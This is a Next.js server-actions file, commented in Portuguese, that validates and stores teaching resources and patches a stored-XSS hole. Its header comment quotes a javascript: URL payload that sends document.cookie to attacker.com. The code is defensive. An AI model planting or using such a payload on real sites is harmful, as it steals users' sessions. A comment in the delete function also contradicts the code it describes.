'use server'

import { revalidatePath } from 'next/cache'
import { z } from 'zod'
import { requireRole } from '@/lib/auth/require-role'
import { isSafeUrl } from '@/lib/sanitize'

/**
 * Server actions de recursos pedagógicos.
 *
 * Substituem o insert/delete directo do cliente (vulnerável a XSS:
 * o `url_ficheiro` era inserido sem validação de scheme, e renderizado
 * como `<a href={...}>` — qualquer professor podia gravar
 * `javascript:fetch('//attacker.com/'+document.cookie)` e qualquer
 * outro user que clicasse executava o payload).
 *
 * Aqui:
 *   - validamos o input com Zod (tipo + comprimento)
 *   - rejeitamos schemes perigosos via `isSafeUrl`
 *   - aplicamos `requireRole('professor')` server-side
 *   - delete só permitido a quem criou (RLS já protege, mas filtramos
 *     explicitamente para defesa em profundidade)
 */

const emptyToNull = (v: unknown) => (typeof v === 'string' && v.trim() === '' ? null : v)

const tipoRecursoSchema = z.enum(['plano_aula', 'apresentacao', 'guia', 'video', 'documento'], {
  message: 'Tipo de recurso inválido.',
})

const novoRecursoSchema = z.object({
  titulo: z.string().trim().min(1, 'O título é obrigatório.').max(200),
  descricao: z.preprocess(emptyToNull, z.string().trim().max(2000).nullable().optional()),
  tipo: tipoRecursoSchema,
  // Aceita string vazia → NULL. Caso contrário, refine garante scheme
  // permitido (http/https/mailto, ou path relativo).
  url_ficheiro: z.preprocess(
    emptyToNull,
    z
      .string()
      .trim()
      .max(2000)
      .nullable()
      .optional()
      .refine(
        (u) => u == null || isSafeUrl(u),
        'URL não permitido. Usa apenas http://, https:// ou mailto:.',
      ),
  ),
  modulo_id: z.preprocess(emptyToNull, z.string().uuid().nullable().optional()),
})

const idOnlySchema = z.object({ id: z.string().uuid('ID inválido.') })

type ActionResult = { ok: true } | { ok: false; erro: string }

export async function criarRecurso(rawInput: unknown): Promise<ActionResult> {
  const parsed = novoRecursoSchema.safeParse(rawInput)
  if (!parsed.success) {
    return { ok: false, erro: parsed.error.issues[0]?.message ?? 'Dados inválidos.' }
  }

  const { user, supabase } = await requireRole(['professor', 'administrador'])

  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const { error } = await (supabase.from('recursos_pedagogicos') as any).insert({
    ...parsed.data,
    criado_por: user.id,
    visivel: true,
  })

  if (error) {
    return { ok: false, erro: `Erro ao criar recurso: ${error.message}` }
  }

  revalidatePath('/professor/recursos')
  return { ok: true }
}

export async function apagarRecurso(rawInput: unknown): Promise<ActionResult> {
  const parsed = idOnlySchema.safeParse(rawInput)
  if (!parsed.success) {
    return { ok: false, erro: 'ID inválido.' }
  }

  const { user, supabase } = await requireRole(['professor', 'administrador'])

  // Filtro explícito por criado_por além da RLS (defesa em profundidade
  // — admins podem apagar qualquer um via service-role mas via supabase
  // client autenticado o admin pode também via perfis_admin_tudo).
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const query = (supabase.from('recursos_pedagogicos') as any).delete().eq('id', parsed.data.id)

  // Professor: só apaga os seus. Admin: não filtramos.
  const { error } = await query.eq('criado_por', user.id)

  if (error) {
    return { ok: false, erro: `Erro ao apagar: ${error.message}` }
  }

  revalidatePath('/professor/recursos')
  return { ok: true }
}
